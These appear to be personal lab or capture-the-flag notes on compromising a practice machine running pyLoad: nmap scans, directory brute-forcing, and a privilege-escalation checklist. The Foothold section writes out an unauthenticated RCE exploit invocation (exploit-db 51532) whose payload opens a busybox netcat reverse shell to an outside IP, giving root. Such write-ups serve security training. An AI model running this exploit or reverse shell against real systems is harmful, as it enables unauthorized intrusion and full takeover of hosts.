### Enumeration
```
IP=192.168.170.26
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,9666 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- 9666
	- CherryPy wsgiserver
	- Cheroot/8.6.0
### Foothold
- 9666
	- Default landing page
		- ![[Pasted image 20240714125709.png]]
	- Versions
		- pyload
			- checked github, tried few version docs, 404 resposne
			- A few unauthenticated RCE
				- exploit-db 51532
				- `python3 51532.py -u http://$IP:9666 -c 'busybox nc 192.168.45.195 22 -e /bin/bash'
				- Gives root shell
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
### PE
#### Linux
- USERNAME
	- id
	- sudo -l
	- uname -a
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- Users with console
	- linpeas
### Lessons Learned
- Check google for versions